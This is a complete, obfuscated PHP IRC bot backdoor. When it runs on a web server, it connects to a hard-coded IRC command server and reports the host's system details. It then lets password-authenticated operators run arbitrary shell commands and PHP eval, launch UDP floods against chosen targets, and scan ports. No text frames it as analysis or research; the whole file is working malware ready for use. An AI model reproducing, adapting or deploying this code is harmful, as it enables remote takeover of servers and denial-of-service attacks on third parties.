<?php set_time_limit(0); error_reporting(0);  class vNfJRnZvvZBJjjRzZ {

 var $VVVnrRRvJJJRzZj = array("NbVBrrZNnZvZJjZF"=>"gang.sexpil.net",
                     "bRZr"=>"23232",
                     "fNfBV"=>"scary",
                     "Rjjnfv"=>"13",
                     "HllLH"=>"#wWw#",
                     "rZZ"=>"scan",
                     "fvbFNjRVN"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "jJvVvBnvjb"=>".",
                     "vjJVvbRbVrv"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $VvrnBrbNvfFRBjVFJr = array(); 
 function YqiQYymuqmEImEeyeM($xTTD,$xXDxdhXHdL,$qUMI) {
	$this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"[\002UdpFlood Gestart!\002]"); 
	$LxtXLdDDD = "";
	for($p=0;$p<$xXDxdhXHdL;$p++) { $LxtXLdDDD .= chr(mt_rand(1,256)); }
	$TLxpD = time();
	$p = 0;
	while(time()-$TLxpD < $qUMI) {
		$ft=fsockopen("udp://".$xTTD,mt_rand(0,6000),$e,$s,5);
      	fwrite($ft,$LxtXLdDDD);
       	fclose($ft);
		$p++;
	}
	$ngX = $p * $xXDxdhXHdL;
	$ngX = $ngX / 1048576;
	$xFG = $ngX / $qUMI;
	$xFG = round($xFG);
	$ngX = round($ngX);
	$this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"[\002UdpFlood Afgerond!\002]: $ngX MB verzonden / gemiddelde: $xFG MB/s ");
 } function MEYmEUEQyYUyIQAA() {
  $XDDhhX = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $dtPdPdh = strlen($XDDhhX);
  for($p=0;$p<$this->VVVnrRRvJJJRzZj['Rjjnfv'];$p++) {
	$IQm .= $XDDhhX[rand(0,$dtPdPdh-1)];
  }
  $this->ieiqAeQ("NICK ".$IQm."");
 } function qUAeMIIYUAi($xx,$tLt)
 {
    $this->ieiqAeQ("PRIVMSG $xx :$tLt");
 } function yuqMeUaAiYAqi() 
 { 
    if(!($this->kKGGCswcw = fsockopen($this->VVVnrRRvJJJRzZj['NbVBrrZNnZvZJjZF'],$this->VVVnrRRvJJJRzZj['bRZr'],$e,$s,30))) 
    $this->yuqMeUaAiYAqi(); 
    $this->yiAEmauaEuEiUayEe();
    if(strlen($this->VVVnrRRvJJJRzZj['fNfBV'])>0) 
    $this->ieiqAeQ("PASS ".$this->VVVnrRRvJJJRzZj['fNfBV']);
    $this->MEYmEUEQyYUyIQAA();
    $this->iAeaAQmayaEYYQ();
 } function iAiQaYUiQeeA($xTTD) 
 { 
    if(isset($this->VvrnBrbNvfFRBjVFJr[$xTTD])) 
       return 1; 
    else 
       return 0; 
 } function UeAiiUmq($xTTD) 
 { 
    unset($this->VvrnBrbNvfFRBjVFJr[$xTTD]); 
 } function ieiqAeQ($tLt) 
 { 
    fwrite($this->kKGGCswcw,"$tLt\r\n"); 
 } function mIIQmauYuYuAaUUmIqm() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $hptdxxHDDdx = "\0034ON\003"; } else { $hptdxxHDDdx = "\0039OFF\003"; }

	$dxpxxpXp = php_uname();
	if($dxpxxpXp == "") { $BbcKXh = "\00315---\003"; } else { $BbcKXh = "\00315".$dxpxxpXp."\003"; }
		 
	 $NfSC = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $thsgo =  getcwd()."";
	 
	 $PoOG = "\00315".$thsgo."\003";

	$ksKGSgOScc = fileperms("$thsgo");

	if (($ksKGSgOScc & 0xC000) == 0xC000) { $cKGWsOoCSoG = 's';
	} elseif (($ksKGSgOScc & 0xA000) == 0xA000) { $cKGWsOoCSoG = 'l';
	} elseif (($ksKGSgOScc & 0x8000) == 0x8000) { $cKGWsOoCSoG = '-';
	} elseif (($ksKGSgOScc & 0x6000) == 0x6000) { $cKGWsOoCSoG = 'b';
	} elseif (($ksKGSgOScc & 0x4000) == 0x4000) { $cKGWsOoCSoG = 'd';
	} elseif (($ksKGSgOScc & 0x2000) == 0x2000) { $cKGWsOoCSoG = 'c';
	} elseif (($ksKGSgOScc & 0x1000) == 0x1000) { $cKGWsOoCSoG = 'p';
	} else { $cKGWsOoCSoG = 'u'; }

	$cKGWsOoCSoG .= (($ksKGSgOScc & 0x0100) ? 'r' : '-');
	$cKGWsOoCSoG .= (($ksKGSgOScc & 0x0080) ? 'w' : '-');
	$cKGWsOoCSoG .= (($ksKGSgOScc & 0x0040) ?	(($ksKGSgOScc & 0x0800) ? 's' : 'x' ) :	(($ksKGSgOScc & 0x0800) ? 'S' : '-'));

	$cKGWsOoCSoG .= (($ksKGSgOScc & 0x0020) ? 'r' : '-');
	$cKGWsOoCSoG .= (($ksKGSgOScc & 0x0010) ? 'w' : '-');
	$cKGWsOoCSoG .= (($ksKGSgOScc & 0x0008) ?	(($ksKGSgOScc & 0x0400) ? 's' : 'x' ) :	(($ksKGSgOScc & 0x0400) ? 'S' : '-'));

	$cKGWsOoCSoG .= (($ksKGSgOScc & 0x0004) ? 'r' : '-');
	$cKGWsOoCSoG .= (($ksKGSgOScc & 0x0002) ? 'w' : '-');
	$cKGWsOoCSoG .= (($ksKGSgOScc & 0x0001) ?	(($ksKGSgOScc & 0x0200) ? 't' : 'x' ) :	(($ksKGSgOScc & 0x0200) ? 'T' : '-'));
			
	$rvtl = "\00315".$cKGWsOoCSoG."\003";

	$this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"\00314[SAFE:\003\002 $hptdxxHDDdx\002\00314]\00315 $NfSC \00314[pwd:]\00315 $PoOG \00314(\003$rvtl\00314) [uname:]\00315 $BbcKXh");
 } function yAEamEIqm($xTTD) 
 { 
    $this->VvrnBrbNvfFRBjVFJr[$xTTD] = true; 
 } function uMqQqMiAqU($xx,$tLt)
 {
    $this->ieiqAeQ("NOTICE $xx :$tLt");
 }function iAeaAQmayaEYYQ() 
 { 
    while(!feof($this->kKGGCswcw)) 
    { 
       $this->AeaIm = trim(fgets($this->kKGGCswcw,512)); 
       $fzRjbbVVvFFFz = explode(" ",$this->AeaIm); 
       if(substr($this->AeaIm,0,6)=="PING :") 
       { 
          $this->ieiqAeQ("PONG :".substr($this->AeaIm,6)); 
       } 
       if(isset($fzRjbbVVvFFFz[1]) && $fzRjbbVVvFFFz[1] =="004") 
       { 
          $this->ieiqAeQ("JOIN ".$this->VVVnrRRvJJJRzZj['HllLH']." ".$this->VVVnrRRvJJJRzZj['rZZ']."");
          $this->UEUEUu($this->VVVnrRRvJJJRzZj['HllLH'],$this->VVVnrRRvJJJRzZj['rZZ']);
          $this->mIIQmauYuYuAaUUmIqm();
       } 
       if(isset($fzRjbbVVvFFFz[1]) && $fzRjbbVVvFFFz[1]=="433") 
       { 
          $this->MEYmEUEQyYUyIQAA(); 
       }
       if($this->AeaIm != $zVN_dtl) 
       { 
          $ZBBNvjRrvzjRBz = array(); 
          $GKc = substr(strstr($this->AeaIm," :"),2); 
          $CssS = explode(" ",$GKc); 
          $oScGs = explode("!",$fzRjbbVVvFFFz[0]); 
          $CwosOo = explode("@",$oScGs[1]); 
          $CwosOo = $CwosOo[1]; 
          $oScGs = substr($oScGs[0],1); 
          $koCgWgW = $fzRjbbVVvFFFz[0]; 
          if($CssS[0]==$this->oScGs) 
          { 
           for($p=0;$p<count($CssS);$p++) 
              $ZBBNvjRrvzjRBz[$p] = $CssS[$p+1]; 
          } 
          else 
          { 
           for($p=0;$p<count($CssS);$p++) 
              $ZBBNvjRrvzjRBz[$p] = $CssS[$p]; 
          } 
          if(count($fzRjbbVVvFFFz)>2) 
          { 
             switch($fzRjbbVVvFFFz[1]) 
             { 
                case "QUIT": 
                   if($this->iAiQaYUiQeeA($koCgWgW)) 
                   { 
                      $this->UeAiiUmq($koCgWgW); 
                   } 
                break; 
                case "PART": 
                   if($this->iAiQaYUiQeeA($koCgWgW)) 
                   { 
                      $this->UeAiiUmq($koCgWgW); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->iAiQaYUiQeeA($koCgWgW) && (md5($CwosOo) == $this->VVVnrRRvJJJRzZj['vjJVvbRbVrv'] || $this->VVVnrRRvJJJRzZj['vjJVvbRbVrv'] == "*")) 
                   { 
                      if(substr($ZBBNvjRrvzjRBz[0],0,1)==$this->VVVnrRRvJJJRzZj['jJvVvBnvjb']) 
                      { 
                         switch(substr($ZBBNvjRrvzjRBz[0],1)) 
                         { 
                            case "user": 
                              if(md5($ZBBNvjRrvzjRBz[1])==$this->VVVnrRRvJJJRzZj['fvbFNjRVN']) 
                              { 
                                 $this->yAEamEIqm($koCgWgW);
                              } 
                              else 
                              { 
                                 $this->uMqQqMiAqU($this->VVVnrRRvJJJRzZj['HllLH'],"[\002Auth\002]: Fout password $oScGs idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->iAiQaYUiQeeA($koCgWgW)) 
                   { 
                      if(substr($ZBBNvjRrvzjRBz[0],0,1)==$this->VVVnrRRvJJJRzZj['jJvVvBnvjb']) 
                      { 
                         switch(substr($ZBBNvjRrvzjRBz[0],1)) 
                         {                            case "passthru": 
                               $SGwgCkwkcCsC = substr(strstr($GKc,$ZBBNvjRrvzjRBz[0]),strlen($ZBBNvjRrvzjRBz[0])+1); 

                               $gSwWgCWoKgcSk = passthru($SGwgCkwkcCsC); 
                               $gsGGwGWGcGGocS = explode("\n",$gSwWgCWoKgcSk); 
                               for($p=0;$p<count($gsGGwGWGcGGocS);$p++) 
                                  if($gsGGwGWGcGGocS[$p]!=NULL) 
                                     $this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"      : ".trim($gsGGwGWGcGGocS[$p])); 
                            break;                            case "udpflood": 
                               if(count($ZBBNvjRrvzjRBz)>3) 
                               { 
                                  $this->YqiQYymuqmEImEeyeM($ZBBNvjRrvzjRBz[1],$ZBBNvjRrvzjRBz[2],$ZBBNvjRrvzjRBz[3]); 
                               } 
                            break;                            case "system": 
                               $SGwgCkwkcCsC = substr(strstr($GKc,$ZBBNvjRrvzjRBz[0]),strlen($ZBBNvjRrvzjRBz[0])+1); 
                               $gSwWgCWoKgcSk = system($SGwgCkwkcCsC); 
                               $gsGGwGWGcGGocS = explode("\n",$gSwWgCWoKgcSk); 
                               for($p=0;$p<count($gsGGwGWGcGGocS);$p++) 
                                  if($gsGGwGWGcGGocS[$p]!=NULL) 
                                     $this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"      : ".trim($gsGGwGWGcGGocS[$p])); 
                            break;                            case "restart": 
                               $this->ieiqAeQ("QUIT :gerestart door $oScGs");
                               fclose($this->kKGGCswcw); 
                               $this->yuqMeUaAiYAqi(); 
                            break;                            case "exec": 
                               $SGwgCkwkcCsC = substr(strstr($GKc,$ZBBNvjRrvzjRBz[0]),strlen($ZBBNvjRrvzjRBz[0])+1); 
                               $gSwWgCWoKgcSk = exec($SGwgCkwkcCsC); 
                               $gsGGwGWGcGGocS = explode("\n",$gSwWgCWoKgcSk); 
                               for($p=0;$p<count($gsGGwGWGcGGocS);$p++) 
                                  if($gsGGwGWGcGGocS[$p]!=NULL) 
                                     $this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"      : ".trim($gsGGwGWGcGGocS[$p])); 
                            break;                            case "pscan": 
                               if(count($ZBBNvjRrvzjRBz) > 2) 
                               { 
                                  if(fsockopen($ZBBNvjRrvzjRBz[1],$ZBBNvjRrvzjRBz[2],$e,$s,15)) 
                                     $this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"[\002pscan\002]: ".$ZBBNvjRrvzjRBz[1].":".$ZBBNvjRrvzjRBz[2]." is \2open\2"); 
                                  else 
                                     $this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"[\002pscan\002]: ".$ZBBNvjRrvzjRBz[1].":".$ZBBNvjRrvzjRBz[2]." is \2closed\2"); 
                               } 
                            break;                            case "logout": 
                               $this->UeAiiUmq($koCgWgW); 
                               $this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"[\002Auth\002]\00314 Je bent nu uitgelogt $oScGs"); 
                            break;                            case "sexec":
                               $SGwgCkwkcCsC = substr(strstr($GKc,$ZBBNvjRrvzjRBz[0]),strlen($ZBBNvjRrvzjRBz[0])+1); 
                               $gSwWgCWoKgcSk = shell_exec($SGwgCkwkcCsC); 
                               $gsGGwGWGcGGocS = explode("\n",$gSwWgCWoKgcSk); 
                               for($p=0;$p<count($gsGGwGWGcGGocS);$p++) 
                                  if($gsGGwGWGcGGocS[$p]!=NULL) 
                                     $this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"      : ".trim($gsGGwGWGcGGocS[$p])); 
                            break;                            case "raw":
                               $this->ieiqAeQ(strstr($GKc,$ZBBNvjRrvzjRBz[1])); 
                            break;                            case "info":
                               $this->mIIQmauYuYuAaUUmIqm();
                            break;                            case "dns": 
                               if(isset($ZBBNvjRrvzjRBz[1])) 
                               { 
                                  $sc = explode(".",$ZBBNvjRrvzjRBz[1]); 
                                  if(count($sc)==4 && is_numeric($sc[0]) && is_numeric($sc[1]) && is_numeric($sc[2]) && is_numeric($sc[3])) 
                                  { 
                                     $this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"[\002dns\002]: ".$ZBBNvjRrvzjRBz[1]." => ".gethostbyaddr($ZBBNvjRrvzjRBz[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->qUAeMIIYUAi($this->VVVnrRRvJJJRzZj['HllLH'],"[\002dns\002]: ".$ZBBNvjRrvzjRBz[1]." => ".gethostbyname($ZBBNvjRrvzjRBz[1])); 
                                  } 
                               } 
                            break;                            case "rndnick": 
                               $this->MEYmEUEQyYUyIQAA(); 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($GKc,$ZBBNvjRrvzjRBz[1]),strlen($ZBBNvjRrvzjRBz[1])));
                            break;                            case "die": 
                               $this->ieiqAeQ("QUIT :die command from $oScGs");
                               fclose($this->kKGGCswcw); 
                               exit;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $zVN_dtl = $this->AeaIm; 
    } 
    $this->yuqMeUaAiYAqi(); 
 } function UEUEUu($HllLH,$rZZ=NULL) 
 { 
    $this->ieiqAeQ("JOIN $HllLH $rZZ"); 
 } function yiAEmauaEuEiUayEe() {
  $XDDhhX = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $dtPdPdh = strlen($XDDhhX);
  for($p=0;$p<6;$p++) {
	$IQm .= $XDDhhX[rand(0,$dtPdPdh-1)];
  }
  if(php_uname() == "") { $dxpxxpXp = "---"; } else { $dxpxxpXp = php_uname(); }
  $this->ieiqAeQ("USER ".$IQm."-go 127.0.0.1 localhost :".$dxpxxpXp."");
 }}
$woocwgKK = new vNfJRnZvvZBJjjRzZ;
$woocwgKK->yuqMeUaAiYAqi(); ?>